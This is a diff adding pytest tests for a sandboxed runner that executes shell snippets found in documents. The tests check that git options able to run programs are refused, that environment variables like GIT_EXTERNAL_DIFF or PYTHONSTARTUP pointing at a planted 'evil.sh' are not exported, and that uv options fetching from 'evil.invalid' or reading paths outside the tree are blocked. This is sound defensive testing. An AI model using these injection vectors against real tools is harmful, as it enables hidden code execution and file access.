@@ -145,3 +145,59 @@ def test_an_assignment_expands_only_the_blocks_own_variables():
         assert "dapi-planted-secret" not in str(r) and "dapi-planted-secret" not in str(state)
         r = snippets.run_shell("Y=$EPM/a\necho $Y", tree, {}, state)  # the reader's variables are the tree's
         assert r["lines"][1]["ran"] and r["lines"][1]["tail"].strip() == os.path.join(tree, "a")
+
+
+def test_git_may_not_run_a_program_and_a_documents_variable_is_not_exported_under_a_tools_name():
+    with tempfile.TemporaryDirectory() as tree:
+        with open(os.path.join(tree, "env.py"), "w") as f:
+            f.write("import os\nprint(sorted(os.environ))\n")
+        state = {}
+        for line in ("git diff --ext-diff", "git diff --textconv", "git log --no-pager", "git diff --output=/tmp/x", "git show --ext-diff HEAD"):
+            r = snippets.run_shell(line, tree, {}, state)
+            assert r["lines"][0]["ran"] is False and "policy" in r["lines"][0]["reason"], (line, r["lines"][0])
+        for line in ("git -c core.pager=x log", "git --config-env=x log"):  # an option before the subcommand: refused as not read-only
+            assert snippets.run_shell(line, tree, {}, state)["lines"][0]["ran"] is False, line
+        evil = os.path.join(tree, "evil.sh")
+        with open(evil, "w") as f:
+            f.write("#!/bin/sh\necho EVIL-RAN > " + os.path.join(tree, "ran.txt") + "\n")
+        os.chmod(evil, 0o755)
+        r = snippets.run_shell(f"GIT_EXTERNAL_DIFF={evil}\nPYTHONSTARTUP={evil}\nUV_PYTHON={evil}\nPATH=/nowhere\nFOO=bar\npython3 env.py --list", tree, {}, state)
+        names = r["lines"][-1]["tail"]
+        assert r["lines"][-1]["returncode"] == 0 and "'FOO'" in names  # a plain variable is exported
+        assert not any(n in names for n in ("GIT_EXTERNAL_DIFF", "PYTHONSTARTUP", "UV_PYTHON")) and "/nowhere" not in names  # a tool's name is not
+        assert not os.path.exists(os.path.join(tree, "ran.txt"))
+
+
+def test_uv_option_values_are_checked_like_operands():
+    with tempfile.TemporaryDirectory() as tree, tempfile.TemporaryDirectory() as outside:
+        with open(os.path.join(tree, "x.py"), "w") as f:
+            f.write("print('ok')\n")
+        state = {}
+        for line in (f"uv run --python {outside}/python3 python x.py --list", "uv run --with ./pkg python x.py --list", "uv run --with https://evil.invalid/p.whl python x.py --list",
+                     f"uv run --project {outside} python x.py --list", "uv run --project ../x python x.py --list", "uv run --group ../g python x.py --list", "uv run --with /tmp/x python x.py --list"):
+            r = snippets.run_shell(line, tree, {}, state)
+            assert r["lines"][0]["ran"] is False and "policy" in r["lines"][0]["reason"], (line, r["lines"][0])
+        import shlex
+        for line in ("uv run --with rdflib --with pyshacl>=0.25 --python 3.12 --group graph python x.py --list", "uv run --with markdown-it-py>=4,<5 python x.py --list"):
+            assert snippets.policy(shlex.split(line), tree, tree) is None, line
+
+
+def test_a_tilde_is_not_expanded_where_it_would_be_printed():
+    with tempfile.TemporaryDirectory() as tree:
+        state = {}
+        r = snippets.run_shell("echo ~\nprintf ~/x", tree, {}, state)
+        assert r["lines"][0]["tail"].strip() == "~" and r["lines"][1]["tail"].strip() == "~/x" and os.path.expanduser("~") not in str(r)
+        for line in ("cat ~/.profile", "cd ~", "# from ~\nls ."):
+            r = snippets.run_shell(line, tree, {}, state)
+            assert r["lines"][0]["ran"] is False, (line, r["lines"][0])  # a path operand with ~ resolves outside the tree and is refused
+
+
+def test_a_complete_query_with_trailing_text_in_a_reference_is_listed_with_the_parsers_position():
+    import pytest
+    pytest.importorskip("rdflib")
+    with tempfile.TemporaryDirectory() as tree:
+        text = "SELECT ?s WHERE { ?s ?p ?o } and then some words that are not SPARQL"
+        r = snippets.run_sparql(text, tree, "skills/ontology/references/x.md")
+        assert r["ran"] is False and "did not parse" in r["reason"] and ("lineno" in r["reason"] or "position" in r["reason"] or "col" in r["reason"])
+        with pytest.raises(Exception):
+            snippets.run_sparql(text, tree, "business_architecture/ontology/README.md")  # the tree's own document: a failure
